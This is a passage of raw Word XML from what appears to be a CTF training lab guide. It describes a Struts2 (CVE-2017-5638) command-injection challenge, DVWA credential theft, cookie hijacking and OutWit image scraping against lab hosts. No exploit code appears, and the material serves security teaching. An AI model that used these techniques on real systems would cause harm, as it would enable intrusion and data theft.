      <w:r>
        <w:t>Jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7428390D" w14:textId="545D978C" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Outwit Image Scraper</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="187502C8" w14:textId="0AAC8D7B" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Outwit </w:t>
      </w:r>
      <w:r w:rsidRPr="004C1FB8">
        <w:t xml:space="preserve">is a simple, straight-to-the-point online image browser. Explore the Web for pictures and easily create, save, and share collections. With </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="004C1FB8">
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="004C1FB8">
        <w:t xml:space="preserve"> Images, you can automatically explore Web pages or search engine results for pictures and create, save and share your collections or view them as full-screen slideshows.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BC64E7" w14:textId="32C10E87" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Outwit is installed on the Windows 7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33570F03" w14:textId="4E6218DF" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Edit This Cookie</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="313E943B" w14:textId="77777777" w:rsidR="004C1FB8" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>EditThisCookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is a Google Chrome extension which allows the user to easily see and manipulate the cookies on the current page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2461047F" w14:textId="087787D6" w:rsidR="004C1FB8" w:rsidRPr="004C1FB8" w:rsidRDefault="004C1FB8">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>EditThisCookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is installed on the Windows 7 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Jumpbox</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A90803D" w14:textId="29A8C094" w:rsidR="000678AE" w:rsidRDefault="000678AE" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="24" w:name="_Toc487296573"/>
      <w:r>
        <w:t>Completing the CTF</w:t>
      </w:r>
      <w:bookmarkEnd w:id="24"/>
    </w:p>
    <w:p w14:paraId="215E8E7B" w14:textId="7411852B" w:rsidR="00AD5676" w:rsidRDefault="00760501" w:rsidP="00720D46">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can complete the CTF Contest without </w:t>
      </w:r>
      <w:r w:rsidR="000678AE">
        <w:t>referring</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the document here, however some of the challenges require some extra tools and some specific knowledge in how to use those tools.  We have added this to the document here for you, allowing you to conduct the challenge by following the examples here.  If you wish, you can do the challenges without these steps.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016AC626" w14:textId="068141E7" w:rsidR="00B16A7C" w:rsidRDefault="00B16A7C" w:rsidP="00B16A7C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc487296574"/>
      <w:r>
        <w:t>Challenge: Remote Command Execution</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="08AFCF58" w14:textId="4CE2FDDE" w:rsidR="00387027" w:rsidRDefault="00387027" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Level 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C3EAC20" w14:textId="20007707" w:rsidR="00387027" w:rsidRDefault="00387027" w:rsidP="00387027">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the </w:t>
      </w:r>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input valida</w:t>
      </w:r>
      <w:r w:rsidR="00720D46">
        <w:t>tion.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16AF32F7" w14:textId="3F865A19" w:rsidR="00387027" w:rsidRDefault="00387027" w:rsidP="00387027">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>In this example, we have an application which uses a vulnerable version of the Struts2 library. This library has a vulnerability in the file upload component, allowing a properly formatted exploit to execute commands on the server. More can be learned about this vulnerability here: https://devcentral.f5.com/articles/apache-struts-remote-code-execution-vu</w:t>
      </w:r>
      <w:r w:rsidR="00720D46">
        <w:t>lnerability-cve-2017-5638-25617</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="521868BB" w14:textId="6A0A0587" w:rsidR="00762802" w:rsidRDefault="00387027" w:rsidP="00387027">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Using the supplied exploit </w:t>
      </w:r>
      <w:r w:rsidR="00A8684E">
        <w:t xml:space="preserve">read the </w:t>
      </w:r>
      <w:r w:rsidR="00A8684E" w:rsidRPr="00526315">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>flag.txt</w:t>
      </w:r>
      <w:r w:rsidR="00A8684E">
        <w:t xml:space="preserve"> file in the Tomcat7 folder.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F0775C" w14:textId="389FECC0" w:rsidR="00720D46" w:rsidRDefault="00720D46" w:rsidP="00420693">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Level 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E86500" w14:textId="452C5912" w:rsidR="00387027" w:rsidRDefault="00720D46" w:rsidP="00720D46">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When there is a php application on a web server, typically credentials are stored within the application config in clear-text. Using this knowledge, the Struts2 vulnerability and the DVWA site, </w:t>
      </w:r>
      <w:r w:rsidR="00A8684E">
        <w:t>access the database for DVWA and get the flag from the database.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="784044E4" w14:textId="26234333" w:rsidR="00B16A7C" w:rsidRDefault="003C6A6C" w:rsidP="00B16A7C">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc487296575"/>
      <w:r>
        <w:t xml:space="preserve">Challenge: </w:t>
      </w:r>
      <w:r w:rsidR="00B16A7C">
        <w:t>Domain Cookie Exploit</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="72C4DC69" w14:textId="484D1BA5" w:rsidR="00762802" w:rsidRDefault="00762802" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>One of the uses of Cookies is to track sessions and identify users. For example, once a user authenticates to a server, the server places a cookie on the user computer that identifies the user. The next time the user accesses the site, they will not be asked to authenticate – the server will check the cookie that identifies the user as authenticated, and allow the user in.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B3C2072" w14:textId="512A6687" w:rsidR="00762802" w:rsidRDefault="00762802" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t>Cookie Hijacking is one of the attacks that can be executed to gain access to privileged information. In this exploit, an attacker would gain access to a cookie that contains user credential information, session information, or other types of information that identify a user to a system. Then the attacker would use this cookie (i.e. copy it to their computer) to gain access to the server.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1010B0EF" w14:textId="2DA63732" w:rsidR="00762802" w:rsidRDefault="00762802" w:rsidP="00762802">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>F5LAB.BIZ is a company that offers financial services to customers. They have two services: hr.f5lab.biz (human resources services) and accounts.f5lab.biz (tax services). Both services use a common backend database to authenticate users.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F7027FC" w14:textId="3CCAEBDB" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="27" w:name="_Toc487296576"/>
      <w:r>
        <w:t xml:space="preserve">Challenge: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>Webscraping</w:t>
      </w:r>
      <w:bookmarkEnd w:id="27"/>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3CBAED8D" w14:textId="14115D79" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>Webscraping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a popular technique used by both white and black hatters to “scrape” a website </w:t>
      </w:r>
      <w:r w:rsidR="00165FD3" w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>to</w:t>
      </w:r>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> harvest information from it. A good example of a mischievous </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>webscraping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> activity would be a competitor scraping a website </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> harvest a product catalog or product prices. Once they obtain this information, they can gain intelligence about their competition and use it for their own ends.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A380F90" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">There are a variety of tools out there to conduct </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>webscraping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">. Some are off-the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>shelf</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> and some are custom-developed. In either case, these tools are smart in that they know how to bypass the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>webscraping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> security controls – by modifying their traffic patterns (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>i.e</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> vary the request rate and frequency to avoid detection)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3F53BF" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Webstore.f5lab.biz is an online business that offers variety of products. It was detected that an attacker has mounted a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>webscraping</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> attack against the website and is copying all the product images. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647CA59E" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">It was discovered that an attacker is using a popular scraping tool </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hub:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CEA996F" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6F710BC4" wp14:editId="5EDD45D4">
            <wp:extent cx="4572000" cy="169545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6F0CF48A" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00526315">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>The setup</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F0E3B55" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Open </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> Hub from the Start Menu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6895B3F6" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="006D31B4" w:rsidRDefault="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">In the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>Hub</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> GUI, go to </w:t>
      </w:r>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
        </w:rPr>
        <w:t>Tools/Preferences/Exports &amp; Downloads</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> and specify a windows folder under “Save files in”</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5225D908" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>This folder is where the hacker (web scraper) will save the scraped images</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1103DAA1" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="006D31B4" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
          <w:b/>
        </w:rPr>
        <w:t>Select Images on the left-hand panel in the GUI:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BE71A58" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="69CCB7F2" wp14:editId="6DB9A843">
            <wp:extent cx="1714500" cy="1257300"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1542957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1714500" cy="1257300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BEA833A" w14:textId="25DE7463" w:rsidR="00882FA7" w:rsidRDefault="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">Note: </w:t>
      </w:r>
      <w:r w:rsidR="00AD5676">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">he </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> application is written in Java so it sometimes has a challenge with resizing on the RDP session. If you cannot see all the panels well (as in the screenshot </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>below</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">), please </w:t>
      </w:r>
      <w:r w:rsidR="00AD5676">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>re</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve">size it and move the sections around in </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>OutWit</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t xml:space="preserve"> until it resembles what you see in the screenshot </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>below</w:t>
      </w:r>
      <w:r w:rsidRPr="006D31B4">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EB91910" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0678FB05" wp14:editId="1FD86806">
            <wp:extent cx="4171950" cy="3031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4073"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4171950" cy="3031490"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E038894" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The highlighted sections in the mage above show the settings that need to be set </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:t>in order to</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> continue with the exercise.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="089B62B8" w14:textId="538F1FAF" w:rsidR="00882FA7" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve">Tell the scraping tool to look for a file called </w:t>
      </w:r>
      <w:r w:rsidRPr="00526315">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
          <w:i/>
        </w:rPr>
        <w:t>flag-hacked.jpg</w:t>
      </w:r>
      <w:r w:rsidRPr="4C011A90">
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
        <w:t>. Finding this file will earn you a point:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C26F539" w14:textId="77777777" w:rsidR="00882FA7" w:rsidRPr="00992F0A" w:rsidRDefault="00882FA7" w:rsidP="00882FA7">
      <w:pPr>
        <w:pStyle w:val="Bodycopy"/>
        <w:rPr>
          <w:rFonts w:eastAsiaTheme="minorEastAsia"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="17EEB937" wp14:editId="199FF25D">
            <wp:extent cx="4152900" cy="2686050"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="1542957473" name="Picture 154295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004"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4152900" cy="2686050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
